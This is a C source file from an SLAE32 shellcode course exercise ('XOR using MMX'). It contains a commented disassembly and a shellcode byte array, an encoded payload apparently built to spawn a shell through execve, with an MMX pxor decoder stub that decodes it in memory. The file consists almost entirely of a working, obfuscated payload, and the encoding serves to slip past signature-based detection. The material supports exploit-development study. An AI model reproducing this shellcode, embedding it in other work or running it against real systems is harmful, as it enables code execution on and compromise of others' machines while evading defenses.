/*
Following video: Module 2-11: XOR using MMX
Using code from NASM\2-11

    /mnt/git/NASM/SLAE32/2-11_XOR-MMX/execve-xor:     file format elf32-i386

    Disassembly of section .text:

    08049000 <_start>:
     8049000:       eb 1b                   jmp    804901d <call_decoder>

    08049002 <decoder>:
     8049002:       5f                      pop    edi
     8049003:       8d 77 08                lea    esi,[edi+0x8]
     8049006:       31 c9                   xor    ecx,ecx
     8049008:       b1 04                   mov    cl,0x4

    0804900a <decode>:
     804900a:       0f 6f 07                movq   mm0,QWORD PTR [edi]
     804900d:       0f 6f 0e                movq   mm1,QWORD PTR [esi]
     8049010:       0f ef c1                pxor   mm0,mm1
     8049013:       0f 7f 06                movq   QWORD PTR [esi],mm0
     8049016:       83 c6 08                add    esi,0x8
     8049019:       e2 ef                   loop   804900a <decode>
     804901b:       eb 0d                   jmp    804902a <EncodedShellcode>

    0804901d <call_decoder>:
     804901d:       e8 e0 ff ff ff          call   8049002 <decoder>

    08049022 <decoder_value>:
     8049022:       aa                      stos   BYTE PTR es:[edi],al
     8049023:       aa                      stos   BYTE PTR es:[edi],al
     8049024:       aa                      stos   BYTE PTR es:[edi],al
     8049025:       aa                      stos   BYTE PTR es:[edi],al
     8049026:       aa                      stos   BYTE PTR es:[edi],al
     8049027:       aa                      stos   BYTE PTR es:[edi],al
     8049028:       aa                      stos   BYTE PTR es:[edi],al
     8049029:       aa                      stos   BYTE PTR es:[edi],al

    0804902a <EncodedShellcode>:
     804902a:       9b                      fwait
     804902b:       6a fa                   push   0xfffffffa
     804902d:       c2 c8 cb                ret    0xcbc8
     8049030:       d9 c2                   fld    st(2)
     8049032:       c2 c8 c3                ret    0xc3c8
     8049035:       c4 85 c2 85 85 85       les    eax,FWORD PTR [ebp-0x7a7a7a3e]
     804903b:       85 23                   test   DWORD PTR [ebx],esp
     804903d:       49                      dec    ecx
     804903e:       fa                      cli    
     804903f:       23 48 f9                and    ecx,DWORD PTR [eax-0x7]
     8049042:       23 4b 1a                and    ecx,DWORD PTR [ebx+0x1a]
     8049045:       a1                      .byte 0xa1
     8049046:       67                      addr16
     8049047:       2a                      .byte 0x2a
*/

unsigned char shellcode[] = {
"\xeb\x1b\x5f\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e"
"\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x0d\xe8\xe0\xff"
"\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\xc8\xcb"
"\xd9\xc2\xc2\xc8\xc3\xc4\x85\xc2\x85\x85\x85\x85\x23\x49\xfa\x23"
"\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
};

unsigned int shellcode_len = sizeof(shellcode)-1;